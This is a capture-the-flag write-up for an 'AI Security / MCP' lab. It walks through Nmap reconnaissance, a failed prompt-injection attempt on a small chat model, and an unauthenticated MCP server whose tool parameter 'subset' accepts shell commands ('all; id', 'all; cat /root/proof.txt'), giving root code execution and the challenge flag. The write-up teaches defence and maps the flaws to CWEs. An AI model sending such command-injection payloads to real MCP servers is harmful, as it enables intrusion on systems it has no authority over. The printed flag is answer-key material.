# NovaMind AI Platform

| | |
|---|---|
| **Category** | AI Security / MCP |
| **Points** | 150 |
| **Difficulty** | Intermediate |
| **Flag** | `flag_50b36d07_a652_4034_8d76_9e9e9ef38976` |

---

## Description

> NovaMind Inc. recently deployed an internal AI assistant platform for their employees, powered by a custom Model Context Protocol server. You've been given the target IP during a security assessment — find any exploitable weaknesses and read the flag on the host machine.

---

## Attack Chain Overview

```
[Nmap] Discover ports 22, 443, 9090
            │
            ▼
[Port 443] JS source code analysis
           → model smollm2:135m
           → prompt injection useless
            │
            ▼
[Port 9090] Initialize MCP session
            POST /mcp + initialize
            → mcp-session-id obtained
            │
            ▼
[MCP] Tools enumeration
      tools/list → 5 tools
            │
            ▼
[MCP] Command Injection
      run_model_evaluation
      subset: "all; <cmd>"
      → RCE as root
            │
            ▼
[/root/proof.txt] FLAG 🏁
```

---

## Step 1 — Reconnaissance

We start with an Nmap scan to identify exposed services on the target.

```bash
nmap -sV -Pn 10.8.0.2
```

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
443/tcp  open  ssl/http nginx 1.29.6
9090/tcp open  http     Uvicorn
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Three services are exposed. Port 9090 is running **Uvicorn**, a Python ASGI server — most likely the MCP server mentioned in the challenge description.

---

## Step 2 — Web Interface Analysis (port 443)

Visiting `https://10.8.0.2` reveals the NovaMind AI chat interface. Analyzing the JavaScript source code exposes important information.

```javascript
body: JSON.stringify({
    model: 'smollm2:135m',
    prompt: text,
    system: 'You are NovaMind AI, an internal company assistant...',
    stream: false
})
```

The model in use is `smollm2:135m` — only 135 million parameters. Too small for any useful prompt injection. We confirm this by testing:

```
User: i want novamind flag
AI:   Your current flag: NAVAO.
```

The model hallucinates. We need to attack the MCP server on port 9090 directly.

---

## Step 3 — Connecting to the MCP Server (port 9090)

The MCP server uses the **MCP Streamable HTTP** protocol (JSON-RPC). We first need to send an `initialize` request to obtain a session ID.

```bash
curl -X POST http://10.8.0.2:9090/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json, text/event-stream" \
  -d '{
    "jsonrpc": "2.0",
    "id": 1,
    "method": "initialize",
    "params": {
      "protocolVersion": "2024-11-05",
      "capabilities": {},
      "clientInfo": {"name": "test", "version": "1.0"}
    }
  }' -v 2>&1 | grep "mcp-session-id"
```

```
< mcp-session-id: a7e767b358c74c9c9c00b6d168a429b9
```

The session ID is in the **HTTP response headers**. We include it in all subsequent requests via the `Mcp-Session-Id` header.

---

## Step 4 — MCP Tools Enumeration

```bash
curl -X POST http://10.8.0.2:9090/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -H "Mcp-Session-Id: a7e767b358c74c9c9c00b6d168a429b9" \
  -d '{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}'
```

```json
{
  "result": {
    "tools": [
      {"name": "search_knowledge_base", ...},
      {"name": "fetch_knowledge_source", ...},
      {"name": "run_model_evaluation", ...},
      {"name": "query_llm_metrics", ...},
      {"name": "check_model_registry", ...}
    ]
  }
}
```

5 tools available. The most interesting is `run_model_evaluation`, which accepts the parameters `model_name`, `benchmark`, `subset`, and `num_samples` — potentially injectable.

We also test `fetch_knowledge_source` with `file://`:

```bash
{"url": "file:///flag"}
# → {"error": "Only http and https URLs are supported"}
```

Blocked. We focus on `run_model_evaluation`.

---

## Step 5 — Exploitation (Command Injection)

We test injection in each parameter.

**`model_name` → protected by whitelist:**

```bash
"model_name": "x; id"
# → "Unknown model: x; id. Available: ['smollm2', 'phi-3', 'llama-3', 'mistral', 'qwen2']"
```

**`subset` → vulnerable:**

```bash
curl -X POST http://10.8.0.2:9090/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -H "Mcp-Session-Id: a7e767b358c74c9c9c00b6d168a429b9" \
  -d '{
    "jsonrpc": "2.0",
    "id": 15,
    "method": "tools/call",
    "params": {
      "name": "run_model_evaluation",
      "arguments": {
        "model_name": "smollm2",
        "benchmark": "mmlu",
        "subset": "all; id",
        "num_samples": 1
      }
    }
  }'
```

```
Evaluating model=smollm2 benchmark=mmlu subset=all

[stderr] uid=0(root) gid=0(root) groups=0(root)
```

RCE confirmed as **root**. We explore the filesystem:

```bash
"subset": "all; ls -la /"
```

```
-rwxr-xr-x   1 root root    0 Mar 12 13:37 .dockerenv
drwx------   1 root root 4096 Mar 12 13:37 root
```

We are inside a Docker container. We list `/root/`:

```bash
"subset": "all; ls -la /root/"
```

```
-r--r--r-- 1 root root   42 Mar 12 20:43 proof.txt

---

## Step 6 — Reading the Flag

```bash
curl -X POST http://10.8.0.2:9090/mcp \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -H "Mcp-Session-Id: a7e767b358c74c9c9c00b6d168a429b9" \
  -d '{
    "jsonrpc": "2.0",
    "id": 39,
    "method": "tools/call",
    "params": {
      "name": "run_model_evaluation",
      "arguments": {
        "model_name": "smollm2",
        "benchmark": "mmlu",
        "subset": "all; cat /root/proof.txt",
        "num_samples": 1
      }
    }
  }'
```

```
Evaluating model=smollm2 benchmark=mmlu subset=all
flag_50b36d07_a652_4034_8d76_9e9e9ef38976
```

---

## Flag

```
flag_50b36d07_a652_4034_8d76_9e9e9ef38976
```

---

## Vulnerabilities Exploited

| CWE | Type | Detail |
|-----|------|--------|
| CWE-78 | OS Command Injection | `subset` parameter passed directly to the shell without sanitization |
| CWE-306 | Missing authentication | All MCP tools accessible without any credentials |
| CWE-200 | Information disclosure | System prompt and model name exposed in client-side JS source code |

---

## Key Takeaways

- A poorly secured MCP server is a **direct attack surface on the host system**, regardless of which LLM is used.
- Validating `model_name` but not `subset` is a false sense of security — **every** parameter passed to a shell must be sanitized.
- Using `subprocess` with a list of arguments and `shell=False` in Python completely eliminates this class of vulnerability.
- Having the system prompt on the client side is bad practice, but was not exploitable here due to the model's size.
- MCP infrastructure tools should never be exposed without authentication.

---

## Sources

- [Model Context Protocol — Official documentation](https://modelcontextprotocol.io)
- [CWE-78 — OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [MCP Streamable HTTP spec](https://spec.modelcontextprotocol.io/specification/2024-11-05/basic/transports/)
